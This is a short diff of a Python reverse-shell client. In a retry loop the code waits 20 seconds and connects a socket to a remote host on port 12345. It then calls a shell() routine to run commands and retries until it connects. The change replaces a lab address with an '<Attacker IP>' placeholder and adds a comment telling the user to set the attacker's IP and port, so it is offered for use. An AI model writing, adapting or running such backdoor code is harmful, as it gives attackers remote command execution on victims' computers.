@@ -24,7 +24,7 @@ def connection():
     while True:                        # Loop until a successful connection is made
         time.sleep(20)                 # Wait 20 seconds before attempting a connection
         try:
-            s.connect(('10.0.2.22', 12345)) # Connect to the server at IP 10.0.2.22 on port 12345
+            s.connect(('<Attacker IP>', 12345)) # <== Change the IP address and the port number
             shell()                     # Start the shell function to handle commands
             s.close()                   # Close the connection after the shell loop ends
             break                       # Exit the loop after successful execution
